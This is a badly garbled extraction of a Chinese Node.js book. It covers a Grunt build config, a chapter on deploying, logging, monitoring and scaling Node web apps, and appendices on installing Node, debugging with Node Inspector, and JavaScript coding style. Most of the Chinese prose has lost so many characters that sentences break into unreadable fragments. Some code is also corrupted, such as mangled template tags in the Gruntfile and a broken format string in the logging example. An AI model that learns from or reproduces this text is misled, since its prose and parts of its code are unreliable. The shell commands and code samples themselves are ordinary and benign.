grunt.initConfig({  pkg: grunt.file.readJSON('package.json'), jshint: { 
all: { src: ['Gruntfile.js', 'src/**/*.js', 'test/**/*.js'], options: { 
 jshintrc: "jshint.json" } 
}  },  clean: ["lib"],  concat: { 
htmlhint: { src: ['src/core.js', 'src/reporter.js', 'src/htmlparser.js', 'src/rules/*.js'], dest: 'lib/htmlhint.js' 
}  },  uglify: { 
htmlhint: { options: {  banner: "/*!\r\n * HTMLHint v< = pkg.version %>\r\n *
% 
https://github.com/yaniswang/HTMLHint\r\n *\r\n * (c) 2013 Yanis Wang <yanis.wang@gmail.com>.\r\n * MIT Licensed\r\n */\n",  beautify: { ascii_only: true 
} }, files: { 
 'lib/< =%  pkg.name %>.js': ['< = concat.htmlhint.dest 
%%>'] } 
}  },  replace: { 
htmlhint: { files: { 'lib/htmlhint.js':'lib/htmlhint.js'}, 
options: { 
 prefix: '@', 
 variables: { 
'VERSION': '< = pkg.version %>' 
% 
} 
} 
} 
} 
}); 
grunt.registerTask('dev', ['jshint', 'concat']); 
grunt.registerTask('default', ['jshint', 'clean', 'concat', 'uglify', 'replace']); 
}; 
make工Grunt有，是对于不熟悉bash编程的开发者，Grunt。
11.1.3
了好的目后，工程是有了一个不的开。也很有人一个有很多人过JavaScript开发应用的情景，在JavaScript应用场景多的情下，个一起一会很。多人相的，会不一问题。是否好的可性是最能质的。为统一好的编，有于的可读性，可性。目中的可性是目后本的要因，一不可性，后目的bug复都会大的本。在目一开始就定本的编，统一的。
编的统一一有几实，一是的定，一是时的强。前者自，后者工。
在JSLintJSHint工的下，在已经能很好了。一定了编的，可以生一。一些工者编能过对源，接开发者问题在。
目前，我过为目创.jshintrc，Sublime Text 2编在后可以实时自动
，并编中的问题在。
关于编，可以C，中有的。
JavaScript是一门过于灵活的语言，个应有自己的，使编能灵活，这对于工程是一个很好的。
11.1.4
立在的过程中。目前，开源社区大多过GitHub实托管。对于一些，也过gitlab开源工了内部的托管。这托管了实托管外，还强了bug的系统，并且用git的分，可以很好实。git的分开发灵活，于分开发。开发者可以很从，后11 能的开发，开发后，，发起并请可。图11-1为发起并请的程图。

图11-1发起并请的程图
要在请并的过程中，要的有能是否、编是否、测试是否有加。不，就要新，后，只有过之后，才应并。图11-2了的程图。

图11-2的程图
要一定的，一些可以自动的工作可以由工自动，编的。后的，还要人工认。管实会一定的，是质量的的好还是会产品的。
在并的过程中，一还会测试的环境，一都没有问题之后才会上线部。
11.2
在开发、、并之后，才会入部程。管经过一系的人工测试的质量，也并不能接上线到生产环境中接，还要在测试环境中测试之后才入生产环境线上测试。
11.2.1
在实的目中，有个要，一是能的性，一是与数相关的。一个是的，会测试环境开发者测试人的动是否。之以要有的测试环境，是为了关因的。是对于一些能言，它的为是与数相关的，测试环境中的数在者大小上不能测试，要在一个发环境中测试。发环境与的测试环境的在于它的数为接线上实的数。
我们测试环境为stage环境，发环境为pre-release环境，实的生产环境为product环境，个部程图11-3。

图11-3部程图
11.2.2
就的言，我们接在中node file.js以动应用。这对于开发中的应用言，时中程并问题。是对时的服务程言，这在个问题这会一个，次着的会开的程一并。为了能程续，我们可能会用到nohup&以不程的
nohup node app.js & 
动程很，是还有个要程程。工管的会，为，我们要一个脚本实应用的动、作。要这样的作，bash脚本是最的。bash脚本的内过与Web应用以定的实。这的定，实就是要解决程ID不的问题。没有定，我们要到应用对应的程，后用kill程。这要用ps，相关下
$ ps aux | grep node jacksontian 3618 0.0 0.0 2432768 592 s002 R+ 3:00PM 0:00.00 grep node jacksontian 3614 0.0 0.4 3054400 32612 s000 S+ 2:59PM 0:00.69 /usr/local/bin/node /Users/jacksontian/git/h5/app.js 
后对应的Node程kill 3614。这的定是，程在动时程ID写入到一个pid中，这个可以在一个定的下，应用的run/app.pid。下是pid写入到中的
var fs = require('fs'); var path = require('path'); 
var pidfile = path.join(__dirname, 'run/app.pid'); fs.writeFileSync(pidfile, process.pid); 
脚本在应用时过kill程发SIGTERM信，程收到信时app.pid，时程，相关下
process.on('SIGTERM', function () { if (fs.existsSync(pidfile)) { 
 fs.unlinkSync(pidfile); } process.exit(0); 
}); 
下是一个的bash脚本，用于应用的动、作
#!/bin/sh DIR=`pwd` NODE=`which node` # get action ACTION=$1 
# help 
usage() { echo "Usage: ./appctl.sh {start|stop|restart}" exit 1; 
} 
get_pid() { if [ -f ./run/app.pid ]; then  echo `cat ./run/app.pid` fi } 
# start app start() { pid=`get_pid` 
if [ ! -z $pid ]; then  echo 'server is already running' 
else  $NODE $DIR/app.js 2>&1 &  echo 'server is running' 
fi } 
# stop app 
stop() { pid=`get_pid` if [ -z $pid ]; then 
 echo 'server not running' 
else  echo "server is stopping ..."  kill -15 $pid  echo "server stopped !" 
fi } 
restart() { stop sleep 0.5 echo ===== start 
} 
case "$ACTION" in start) 
 start ;; stop) 
 stop ;; restart) 
 restart ;; *) 
 usage ;; esac 
在部的过程中，只要这个bash脚本可，工管程
./appctl.sh start ./appctl.sh stop ./appctl.sh restart 
这个脚本的心就是run/app.pid作的。要程ID，只要读可。
11.3
Node产品的性能与多因相关，这我们到Web应用中，只一些的性能的。对于Web应用言，最接有的过于动分、多程、分，中的几个分下。
做一的事。的工做的事情。。分。之外，也能很大的性能。
11.3.1
在的Web应用中，Node管也能过中实服务，是Node的能并不。图、脚本、样多都到的服务上，Node只动请可。这个过程可以用Nginx者的CDN。图11-4为动分的图。

图11-4动分图
动请请分后，服务可以在动服务，的CDN会与用可能，时能有高的机。请分后，对请使用不的多个还能不要的Cookie对下线程数的。
动请分只是最的分，也实。事实上还有复杂的情，一个网页中时在动数内，在Node中内发至客端时要到Buffer的，是对于内言的，只要Buffer可。接Buffer可以很大程上性能，这在6中已过。是能在动内中动内内分，还能一性能，这程上的也没有性，要多。
11.3.2
性能实不多只有个经，一是服务的，是不要的。前者的性能在海量量前有，后者能在问量大时收多。不要的，应用场景最多的就是。
管I/O在CPU时的时为，是在的下，能I/O的时。不管是I/O还是I/O，不要的这好，性能是的。
今，RedisMemcached几是Web应用的。你的产品要应对大的量，用并应用好它，是系统性能的关。
11.3.3
在9中，我们已经了多程。过多程，不仅可以分用多CPU，是可以立机Node程加，以Web应用续服务。由于Node是过自有HTTP服务的，不像大多数服务端技术样有有的Web，以要开发者自己多程的管。不过好在已经有cluster，在社区也有pm、forever、pm2这样的用于程管，这不开。
11.3.4
了动分外，一个为要的分是读写分，这要对数言。就数言，读的高于写入的。些数在写入时为了数一性，会作，这时会到读的。些系统为了性能，会数的读写分，数从，这样读数作不到写入的，了性能的。
外，还有他多用以系统性能，以应对海量的请，这不一一开。
11.4
在实的目中，开发只是个入的一小部分。应用系统上线起时，问题有可能会接。者，有一。多的编写，一些问题是可能在个不定的时候。这情下，与bug复它，不立的机，就是实这机的关。在的系统中，的最能还问题场。过定问题是一本小的。这、量的实，也。
11.4.1
问一用个客端对应用的问。在Web应用中，要HTTP请中的关数。一的Web服务都实了问的能，只要的可用。在用NginxApache反时，可以用这些已有的问的。在Node开发的Web应用中，也可以自实问的。
中Connect在多中中了一个中，过它可以关数一定到中。下是Connect的一
var app = connect(); 
//录访问日志
connect.logger.format('home', ':remote-addr :response-time - [:date] ":method :url 
HTTP/:http-version" :status :res[content-length] ":referrer" ":user-agent" :res[content-length]'); 
app.use(connect.logger({ 
format: 'home', 
stream: fs.createWriteStream(__dirname + '/logs/access.log') 
})); 
这的数有remote-addrresponse-time，这些数已经用分Web应用的用分情、服务端的应时、应客端。这些数于数，能反过网。
从上的中可以，数是以:token的的。Connect了token()用对应实数，下是:status的最
exports.token('status', function(req, res){ 
return res.statusCode; }); 
Connect在最应前会实数token()，后写入到中。在实的应用场景中，可以入一些用信，用以一些数，个用过问个页，他有可能是一个机人，在网页中的数。分，IP，可以实定绝服务。
11.4.2
用些外产生的。过的，开发者可以信定bug的，以复问题。有的分，Node中的console对就实了这几分，下。
. console.log。
. console.info信。
. console.warn信。
. console.error信。

console在实时，log与info都信process.stdout，warn与error信到process.stderr，infoerror分是logwarn的。下为它们的实
Console.prototype.log = function() { this._stdout.write(util.format.apply(this, arguments) + '\n'); }; 
Console.prototype.info = Console.prototype.log; 
Console.prototype.warn = function() { this._stderr.write(util.format.apply(this, arguments) + '\n'); }; 
Console.prototype.error = Console.prototype.warn; 
console对上有一个Console性，它是console对的数。这个数，我们可以实自己的对，相关下
var info = fs.createWriteStream(logdir + '/info.log', {flags: 'a', mode: '0666'}); var error = fs.createWriteStream(logdir + '/error.log', {flags: 'a', mode: '0666'}); 
var logger = new console.Console(info, error); 
分用它的API，内就能自写入到对应的中，相关下
logger.log('Hello world!'); logger.error('segment fault');
有了信的API后，开发者要关心的是要小心一个。在4中，我们到用中数的外部的问题，也到了API编写的，个开发者应API内部发生的作为一个实数。对于数中产生的，可以不用过问，的uncaughtException事可。
在次的API用中，是用还是立过，这是一个要的问题。就的API编写言，量不要，不要过try/catch，后起不外部用者。这对于API的言，为要。事实上，是服务于务的。我的是量由最上的用者，用中用中的只要上的用可。
中用这样写
exports.find = function (id, callback) { // 准SQL db.query(sql, function (err, rows) { 
 if (err) { 
return callback(err); }  //处理结 var data = rows.sort();  callback(null, data); 
}); }; 
上API对下API的不要做，接写可，下
exports.find = function (id, callback) { // 准SQL db.query(sql, callback); 
}; 
是对于最上的务，不能下过的，要，以，时应对用友好的，相关下
exports.index = function (req, res) { proxy.find(id, function (err, rows) { 
 if (err) { logger.error(err); res.writeHead(500); res.end('Error'); return; 
}  res.writeHead(200);  res.end(rows); 
}); }; 
只是过以上，它对的并不大，因为有些的要的数还场，以最好在时有好的的的数。为可以一个format()信，的下
var format = function (msg) { 
var ret = ''; 
if (!msg) { 
 return ret; 
} 
var date = moment(); 
var time = date.format('YYYY-MM-DD HH:mm:ss.SSS'); 
if (msg instanceof Error) {
 var err = { 
name: msg.name, 
data: msg.data 
 }; 
 err.stack = msg.stack; 
 ret =%% %s: s\nHost: %s\nData: %j %
 util.format(' s \n s\n\n', 
time, 
err.name, 
err.stack, 
os.hostname(), 
err.data, 
time 
 ); 
 console.log(ret); 
} else { 
 ret = time + ' ' + util.format.apply(util, arguments) + '\n'; 
} 
return ret; 
}; 
为，我们在时可以用时的数，后下，下
var input = '{error: format}'; 
try { 
JSON.parse(input); 
} catch (ex) { 
ex.data = input; 
logger.error(format(ex)); 
} 
这样在中就可以到发生时的入数，后定bug解决问题就是到的事了。下为
2013-06-12 17:18:19.776 SyntaxError: SyntaxError: Unexpected token e 
 at Object.parse (native) 
 at Object.<anonymous> (/Users/jacksontian/git/diveintonode/examples/12/logger.js:53:8)
 at Module._compile (module.js:456:26) 
 at Object.Module._extensions..js (module.js:474:10) 
 at Module.load (module.js:356:32) 
 at Function.Module._load (module.js:312:12) 
 at Function.Module.runMain (module.js:497:10) 
 at startup (node.js:119:16) 
 at node.js:901:3 
Host: Jackson.local Data: "{error: format}" 2013-06-12 17:18:19.776 
对于的，Node了机以程接，是发生的程也不能继续在线上服务了，因为可能有内的产生。优程在9中已过，一中的多是用console.log()问题的，在实的产品中，要的。过程上，不。
11.4.3
有的开发者对可能不了解，会一些写入到数中。数好的在于它是数，可以接编写SQL语分，要加工之后才能分。
是与数写入在性能上于个，数在写入过程中要经一系，、作。写是接数写到上。为，有大量的问，可能会在写入作大量的，数的于生产，内。相之下，写是量的，分这个分开是好的。可以在线写，分可以一些工到数中，过线分的反。
11.4.4
线上务可能问量大，产生的也可能是大量的，上只是分开在个中，过多时也不接。为，产生的分是一个不的。的写入一都是托在可写上的。对于Console对，它的内部性_stdout_stderr就是我们入的个入对的。在的过程中，我们可以对应的可写对，为可以一个定时用于发生时，对的个入对可。这不开实。
11.4.5
相对言是为的事情，是一好这个过程，有问题产生时可以解决。很多开发者在开发过程中不（没），到线上产生问题时会脚。好的可以为系统的，问题时，我们都能做到心中有数。
11.5
部好程，好之后，应用就可以自了。实上，这时候的应用初生的，学会了走，不管，就它到大上的人中。就像大的11 要有一个人一，应用也应有一个系统。对于走到大上的，，要时起。应用了，也要过时发，后复它。
应用的要有，一是务的，一是的。要过定时样。之外，还要对的信上，一大的动，就要发开发者。为了好开发者使用，到的信一还要过数可的反，以。
11.5.1
的要目的是为了一些要样下，一这些发生大，可以系统问题反到人。的可以很，也可以只要的。
1. 
务的要在上，做了的之后，应用起是个问题。过的动，新的数量反。些与的个系统相关，的个多能反系统的。
了的外，对于问的也能实的务QPS。QPS的能务在时上的分。
外，从问中也能实PVUV的。QPS一样，过对PV/UV的，可以很好应用的使用者们的习、问高。
2. 
应时也是一个要的。一系统的个系统者性能，会系统的应时。应时可以在Nginx一的反上，也可以过应用自产生的问。的系统应时应是动小的、续的。
3. 
应时都能好到系统的，是它们的前是系统是的，以程是前者为要的务。程一是作系统中的应用程数，对于用多程的Web应用，就要工作程的数量，于，就应发。
4. 
要是的用量。由于写的，用。一不用，会发系统的问题。的使用量一个上，一用量过，服务的管者就应了。
5. 
对于Node言，一内，不是的。服务的内使用，可以应用中是否在内的。内只不，定在内问题。的内使用应是有有，在问量大的时候上，在问量的时候，用量也之。
程中在内，一时没有解决，有一可以解决这。这应用于多程的服务，个工作程定服务多次请，到请数之后程就不服务新的接，程动新的工作程服务客，的程有接开后就。这样使在内的，也能有内的。这于问题，只解决了问题的，不推荐使用。
言之，内并时是系统的好。内，也能到是的些动的问题。
6. CPU
服务的CPU用也是不可的，CPU的使用分为用、内、IOWait。用CPU使用高，服务上的应用要大量的CPU开内CPU使用高，服务大量时程者系统用IOWait使用反应的是CPUI/O作。
CPU的使用中，用小于70%、内小于35%且小于70%时，于。CPU用情，可以分应用程序在实务中的。能很好。
7. CPU load
CPU loadCPU，它用作系统前的程，可以解为CPU在时内在使用使用CPU的务数。它有3个，1分的、5分的、15分的。CPU load过高程数量过多，这在Node中可能在用程反复动新的程。可以外产生。
8. I/O
I/O的要是I/O。反应的是上的读写情，对于Node编写的应用，要是网服务，是不可能I/O过高的情，大多数的I/O自于数。不管Node程是否与数他I/O的应用相的服务，我们都应以一。
9. 
网量的优没有上目高，还是要对量并上。应用到用的，量时也能过数到网的是否有。一量过，开发者就应量的因。对于，应是否加为多用服务。
网量的个要是入量量。
10. 
了这些性要测的外，应用还应一机反自的信，外部会续性用应用的反接它的。
最的反就是应一个时，时是否可
app.use('/status', function (req, res) { 
res.writeHead(200); 
res.end(new Date()); 
}); 
一些的应是应用的的，数接是否、是否。
11. DNS
DNS是网应用的，在实的对外服务产品中，多数都对有。DNS产品大的事并不。由于DNS服务是定的，人，一，就可能是前的。对于产品的定性，DNS也要加入。目前国内有一些的DNS服务，DNSPod，可以过这些服务，自己的在线应用。
11.5.2
系统的是系统，有没有能，也是时反开发者的。今的已经能多样，最的、IM在线工作，信在线。
. 系统由Node编写，可以用nodemailer实的发。下为一个发
var nodemailer = require("nodemailer"); 
//建SMTP传输接
var smtpTransport = nodemailer.createTransport("SMTP", { service: "Gmail", auth: { 
 user: "gmail.user@gmail.com",  pass: "userpass" } }); 
//件
var mailOptions = { from: "Fred Foo . <foo@bar.com>", // 发件件to: "bar@bar.com, baz@bar.com", //收件件列表subject: "Hello .", //题text: "Hello world .", //纯文本内容html: "<b>Hello world .</b>" // HTML内容
} 
//发件smtpTransport.sendMail(mailOptions, function (err, response) { if (err) {  console.log(err); } else {  console.log("Message sent: " + response.message); } }); 
. 一些信服务信接入服务，可以在系统中接入服务时，一线上到的时，就信发应用相关的人。
11.5.3
我们发为了应用的定性，实不不入了一个大的系统。系统自的定性对应用要，这的，不能心，，是有系统不没有。
系统自己的定性是外一个题，本不继续开。
11.6
关于应用的定性，实在部分中都有，在49这中有，这从程多程的了定性。一服务不了务的（有的），这就要Node多程的部到多机中。这样机，也能有余机为用服务。之外，为了能好服务用，绝大多数都会在机以因为的网问题。为了好的定性，的就是多程、多机、多机，这样的分在在的网并不。
. 多机部应用的好是能用多的源，为多的请服务。时能在有时，继续服务用请，系统的高可用性。是一分，就要、享数一性问题。在机中请分发到多个程上一样，部多机也要请
分个机，这要在机的上，可能是实，也可能是实，反。图11-5为的图。

图11-5图
对于享数一性，它们与多程的问题是一的，可9，不多。
. 多机部是多机部高次的部，目的是为了解决用问的问题。在，机与机之可以为。由于机与机之的网复杂，要一统，不开。
. 在多机多机的部下，分过的，一机者一个机了服务，都能有余的服务接新的务。在这个机下，我们至要4服务这个定的服务，图11-6。


图11-6服务图
要的是，今技术已经熟，在多服务部中，要量多个服务在相的实机上。因为一实机，多服务一起服务。
应用自的部问题到解决后，还要的是应用的服务的，的数、服务。
11.7
在技术的产品的，一门新技术应用在生产环境中就与已有的系统者服务能否。为了应用一新技术已有的有技术推，并不是一个的。一门新的语言者新的技术在推广应用的过程中都要这样的问题。对于Node言，我在本书中了它的多。可以，它并一个不入的新事，它于C/C++之上，以JavaScript为用语言，以好的事驱动网的，的都能从作系统到它的起源。
在应用Node的过程中，一部分是在新的目中应用，一部分是已有系统过Node性能。几没有已有系统推用Node的。
关于在新目中应用Node，。对于已有系统，NodeC/C++网，已经能与这个上大多数的系统。在于能服务的产品，都是有
的。几是解决系统最的。只要有的，语言就能过网与之。MySQL数，由于有的网，以可以过样的编程语言用。，过Node编写对应的客端驱动也并不是事。图11-7为编程语言与服务之过网用的图。

图11-7编程语言与服务过网用的图
对于一系统，可能并TCP的网，是RESTful的服务接。者的不在于一个是HTTP，于应用一个是TCP，于。次不，性能会。TCP会立的接，甚至接，HTTP可能接，在性能上在。TCP要客端驱动，HTTP本上有的客端。
之，在应用Node的过程中，不在为了用它推已有的情。Node能过与已有的系统很好。Node用于系统的开发者要的是已有的系统是否好的服务，是否多端，是否多语言用。
11.8
一言，决定用一技术产品开发时，只有最是与这门技术相关的。着时的，要解决的已经不是的问题了，一门技术只能在一定上发它的优势。用Node也是一样，着开发的、的多，我们到在产品的要解决的问题是大部分技术都要解决的问题。我们读者能Node入到新的上，使它应产品，在产品中发大的优势。
11.9
本的源为https://github.com/andris9/Nodemailer。
Node  
G   



Node的开发环境分，只要一个时的本编就可以开始开发了，分量。
在经的发友时（v0.2到v0.4），Node要一定的才能在中，并且在Windows下。从v0.6开始，Node用了GYP目生工，时用libuv作为，实了*nix与Windows，这在2中已过，不深。至时候起，Node了在Windows下过Cygwin的。今Node在个本发时，会编好个下的本，接可，编。Node的页http://nodejs.org会你的作系统不的接用下，用只Install可。
在Node的过程中，实上还会上NPM工。对于NPM的作用，2也有。在Nodev0.6.3之前，NPM工的是与Node分的，要外。在v0.6.3时，Node中就开始了NPM的。在不之后，NPM的作者Isaac Z. Schlueter从Ryan Dahl中接过Node门人的，Node的问题复本发。
下个下的，只是上有不。
A.1WindowsNode
对于Windows用，32系统会到http://nodejs.org/dist/<version>/node-<version>-x86.msi这样一个，中version是的本，64系统会到http://nodejs.org/dist/ <version>/x64/node-<version>-x64.msi。下.msi后，接它，时-的一Next可个程。图A-1为Node在Windows系统下的-。
后，开，node -v是否。不外，会到前本的本。样也可以npm -vNPM工是否Node。
，这的<version>是一个v{major}.{minor}.{revision}的，v0. 10.12。

图A-1 Node在Windows系统下的
A.2MacNode
Mac系统下的用与Windows用不的是会到.pkg的包，接也与本相关http://nodejs.org/dist/<version>/node-<version>.pkg。
下后，开.pkg包，也会Windows用样到一个，图A-2。

图A-2 Mac系统下Node的
继续并接可后，着可。
后，在node -vnpm -v可。下是我时的环境
$ node -v v0.8.14 $ npm -v 1.1.65 
A.3LinuxNode
对于Linux系统下的用，推荐过源。开Node页，会到源接http://nodejs.org/dist/<version>/node-<version>.tar.gz。你可以过wgetcurl工下。要的是，编Node时要的几个环境下。
. Python 2.6Python 2.7Node不Python3.0。要因在于GYP目工是用Python开发的，这Python 2.7，因为node-gyp要Python 2.7才能使用。
. Node自有部分过C/C++编写，以要GCCG++编。

. make使用工的3.81本新的本。
对于不的Linux发，可以过自的工（apt-getyum）。下是用源
的过程
//解压源码包$ tar zxvf node-<version>.tar.gz //进入目录$ cd node-<version> //环境配置$ ./configure //配置结{ 'target_defaults': { 'cflags': [], 
'default_configuration': 'Release', 'defines': [], 'include_dirs': [], 'libraries': []}, 
'variables': { 'clang': 1, 'host_arch': 'x64', 'node_install_npm': 'true', 'node_prefix': '', 'node_shared_cares': 'false', 'node_shared_http_parser': 'false', 'node_shared_libuv': 'false', 'node_shared_openssl': 'false', 'node_shared_v8': 'false', 'node_shared_zlib': 'false', 'node_tag': '', 'node_unsafe_optimizations': 0, 'node_use_dtrace': 'true', 'node_use_etw': 'false', 'node_use_openssl': 'true', 'node_use_perfctr': 'false', 'python': '/usr/bin/python', 'target_arch': 'x64', 
'v8_enable_gdbjit': 0, 'v8_no_strict_aliasing': 1, 'v8_use_snapshot': 'true'}} 
creating ./config.gypi creating ./config.mk 
Node用GYP工目。./configure之后，了到以上外，还会在目
下生config.gypiconfig.mk。make后，这个Node的编。
编的过程是一个相对的时，最会在out/Release目下到node。sudo make 
install会node的相关到/usr/local下的libbin目下
$ make $ [sudo] make install 
node -vnpm –v，可以是否
$ node -v v0.8.14 $ npm -v 1.1.65 
事实上，这些作在Mac系统下也一样有。你是一个喜欢的人，可以试从Node的git中到最新的源编，以最新的能
$ git clone https://github.com/joyent/node.git $ cd node 
git tag，你会到有以的（tag）。到最新的，git checkout <version>到上编可。
A.4
在Node后，可以试着用自己喜欢的本编的经为example.js，下
var http = require('http'); 
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n'); 
}).listen(1337, '127.0.0.1'); console.log('Server running at http://127.0.0.1:1337/'); 
后node example.js，是否可以到下
Server running at http://127.0.0.1:1337/ 
用试着开这个，是否到Hello World的。可以到这个，喜你了。
A.5
本的源为https://github.com/joyent/node/wiki/Installation Installation。
Node  
G   



JavaScript作为Node的要编程语言。在大多数的脚本语言中，试是一的事情，JavaScript也不外。在Firefox的Firebug之前，的JavaScript试是在中编写alert()，这的试之前在了很。对于Node言，试的不会像Web开发。这会Node开发中要的几试。
B.1Debugger 
Node的试接于V8。V8了的试API，使可以从程内部试。时还了于API的TCP试，使过试，可以从程外试。Node内了试的客端，以在动时上debug数就可以实对JavaScript的试。
在试前，要过debugger;语在中，这样在时会中。以下为
// myscript.js x = 5; setTimeout(function () { 
debugger; 
console.log("world"); }, 1000); console.log("hello"); 
上时，在中加入debug。加debug在中后，Node会开试能，内
的客端会与V8立接。下的为
$ node debug examples/B/myscript.js < debugger listening on port 5858 connecting... ok break in examples/B/myscript.js:2 1 // myscript.js 
2 x = 5; 3 setTimeout(function () { 4 debugger; 
debug>
在到debugger;语后，中了，并入，入后
后续作。
这要一下，Node的试客端并没有V8的有，只有的的。
中要有下几个。
. contc。继续。
. nextn。到下一个。
. steps。到数内部。. outo。从数内部。
. pause。。过入后，可以过试。过，还可以继续。V8了下几的。
. setBreakpoint()sb()。在前
. setBreakpoint(line)sb(line)。在定的。
. setBreakpoint('fn()')sb(...)。在数的一个。. setBreakpoint('script.js', 1)sb(...)。在脚本的1。
. clearBreakpointcb(...)。。了外，在中后试时，还可以一些信。这些信下。
. backtracebt。前情下的信。. list(5)。前上下前后5的源。. watch(expr)。加到，。. unwatch(expr)。从中对的。. watchers。有的。
. repl。开试的，用于试脚本的上下。V8的试能了在中过debug可以用外，对于已经的程，可以过

发SIGUSR1信用试。过下动了一个服务程$ node server.js  过ps程的ID，后对这个中的程发SIGUSR1信，下$ kill -s USR1 10093 
在有的程下，可以到接收到信并动试客端的信，下
$ node server.js  Hit SIGUSR1 -starting debugger agent. debugger listening on port 5858 
试客端动后，可以过问http://localhost:5858/试。这入我们下一个试工的Node Inspector工就是在这个上实的图试。
B.2Node Inspector 
Node Inspector工是于DebuggerBlink开发者工创的试。在的试能
，源自Node为V8内的试，能自Blink的开发者工。有Blink开发者工的有Chrome、Opera。这着我们可以像试中的JavaScript一样试Node中的JavaScript。
B.2.1Node Inspector 
在使用Node Inspector之前，要过NPM工它为工，下
$ npm install -g node-inspector 
B.2.2
使用NodeInspector用Node程的试。用试的在前有过，在中使用debug者过发SIGUSR1Node程可用试。
动Node程试后，就可以动Node Inspector工。Node Inspector工相于在Blink开发者工与Node程的试之立了系。动下
$ node-inspector 
Node Inspector v0.5.0 
info -socket.io started 
Visit http://127.0.0.1:8080/debug?port=5858 to start debugging. 
中了一些信，这时可以开Blink开发者工的问http://127.0.0.1: 8080/debug?port=5858开始的试。开后会图B-1这样的。

图B-1开后的试
在Sources中可以的JavaScript脚本，后续的试过程就在中试JavaScript一样。
B.3
由于Node要在服务中，试会起中，中服务，不于在有大问量的情下。试只于开发，并且由于过程，不在开发中过于。好的是编写好的测试做的，这对于程序开发量，信也高。
Node 
G   



C.1
JavaScript作为一门编程语言，在语上可是最为灵活的语言了。有人喜欢它的灵活，也有人它的。它的灵活也好，也，都不开生的。Brendan Eich在1995年了10天了这门语言，后在1996年也发了JavaScript的IE3.0。网景为了自己，在1996年11月JavaScriptECMA组织，次年6月一发，为ECMAScript，编262。
年的JavaScript编写分。它的灵活性都高，使开发者可以编，最它在一定程上。在编上，一个要的人是DouglasCrockford，他是JavaScript开发社区最的，是JSON、JSLint、JSMinADSafe之，中JSLint在是最要的JavaScript质量测工。他的JavaScript: TheGoodParts一书对于JavaScript社区深。
，一门语言的发要经多年的才能为大接。由于因，JavaScript在的时内就定，这样它的优都在大之下。Douglas Crockford的JSLintJavaScriptTheGoodParts对JavaScript的贡献在于，他我们能语言中的，写好的。
与他语言（PythonRuby）的程序相，JavaScript程序要多的自才能写读、的。为这个问题，部分开发者TypeScriptCoffeeScript编写应用。我认为了解一门语言为是下这情是有要的。编的目的是在一定程上程序，使之能在中并且。
管JavaScript已经相熟，用JSLint能解决大部分问题，是着Node的，了一些新的，这些要起我们。本是在了JavaScript的编的上，Node的环境社区的习。
C.2
C.2.1
1. 
用2个，不是tab。在编中与是的，tab可能因编的不。2个会起、。
2. 
用var量，不加var时会量，这样可能会外上下，是
外。在ECMAScript 5的strict下，的量会接ReferenceError。
要的是，都应上var，不是只有一个var，下
var assert = require('assert'); var fork = require('child_process').fork; var net = require('net'); var EventEmitter = require('events').EventEmitter; 
下
var assert = require('assert') 
, fork = require('child_process').fork 
, net = require('net') 
, EventEmitter = require('events').EventEmitter; 
3. 
在作前后要加，+、-、*、%、=作前后都应在一个，下
var foo = 'bar' + baz; 
的下
var foo='bar'+baz; 
外，在小括前后应在，
if (true) { 
// some code 
} 
的下
if(true){ 
// some code 
} 
4. 
由于在的场景下使用多，在Node中使用时量使用，这样，
var html = '<a href="http://cnodejs.org">CNode</a>'; 
在JSON中，的是要用，内中时，要。
5. 
一情下，大括起一，
if (true) { // some code } 
的下
if (true) { // some code } 
6. 
用于量的分是的分。不在，前要一个。外，
不在，var foo = 'hello', bar = 'world'; // 是var hello = { foo: 
'hello', bar: 'world' }; //是 var world = ['hello', 'world'];下
var foo = 'hello' 
, bar = 'world'; //是var hello = {foo: 'hello' 
, bar: 'world' }; //是var world = [ 
'hello' , 'world' ]; 
7. 
加分。管JavaScript编会自动加分，还是会一些解，下
function add() { var a = 1, b = 2 return 
a+ b } 
会到undefined的。因为自动加入分后会下的样
function add() { var a = 1, b = 2; return; 
a + b; } 
后续的a + b不会。
下的
x = y (function () { }()) 
时会到
x = y(function () {}()) 
由于自动加分可能的，以加上分有于会。
C.2.2
在编过程中，是。好的可以心目，的阅读享，有好的可性。的要有量、量、、、、包。
1. 
量都用小，了一个的不大写外，个的都大写，与之没有，
var adminUser = {}; 
的下
var admin_user = {}; 
2. 
与量一样，用小。与量不的是，量用动，
var getUser = function () {}; var isAdmin = function () {}; User.prototype.getInfo = function () {}; 
下
var get_user = function () {}; var is_admin = function () {}; User.prototype.get_info = function () {}; 
3. 
用大，有的都大写，
function User { } 
4. 
作为量时，的有都大写，并用下线分，
var PINK_COLOR = "pink"; 
5. 
时，请量用下线分，child_process.jsstring_decode.js。你不
想他用，可以定以下线开，_linklist.js。
6. 
也你有贡献并包发到NPM上。在包中，量不要包jsnode的样，它是复的。包应且有的，
var express = require('express'); 
C.2.3
在作中，是的场景，请量使用=====，否你会到下这样不
的
'0' == 0; // true '' == 0 // true '0' === '' // false 
外，时，可以使用=====。在下的中，foo是0、undefined、
null、false、''时，都会入分
if (!foo) { // some code } 
C.2.4
请量使用{}、[]new Object()、new Array()，不要使用string、bool、number对，不要用new String、new Booleannew Number。
C.2.5
在JavaScript中，要一个关一个，它们是witheval()，起作用。
1. with
下
with (obj) { foo = bar; } 
它的有可能是下之一obj.foo = obj.bar;、obj.foo = bar;、foo = bar;、foo = obj.bar;，这些决于它的作用。作用上没有的量在，使用它是的。在多人作的目中，这并不，以要用with。
2. eval()
用eval()的因与with相。不作用上已在的量，用它是的。外，用eval()的这个性，也可以一些好的性，wind.js用它实了程，4。在大多数情下，本上不到eval()使。下
var obj = { foo: 'hello', bar: 'world' 
}; var key = (Math.round(Math.random() * 100) % 2 === 0) ? 'foo' : 'bar'; var value = eval('(obj.' + key + ')'); 
上多在新中，实只要下一可
var value = obj[key]; 
C.2.6
在JavaScript中，数组实也是对，是者在使用时有些要。
1. 
创对者数组时，在用分。分，一只能一个，下
var foo = ['hello', 'world']; 
var bar = { hello: 'world', pretty: 'code' 
}; 
下
var foo = ['hello', 'world']; var bar = { 
hello: 'world', pretty: 'code' }; 
2. for in
使用for in环时，请对对使用，不要对数组使用，下
var foo = []; foo[100] = 100; for (var i in foo) { 
console.log(i); } for (var i = 0; i < foo.length; i++) { 
console.log(i); } 
在上中，一个环只一次，个环0~100，这并不。
3. 
管在JavaScript内部实中可以数组做对使用，下
var foo = [1, 2, 3]; foo['hello'] = 'world'; 
这在for in时，会到有
for (var i in foo) { console.log(foo[i]); } 
也你只是想到hello已。
C.2.7
在Node中，使用广并且在实践过程中了一些定，这是以不在的。
1. 一
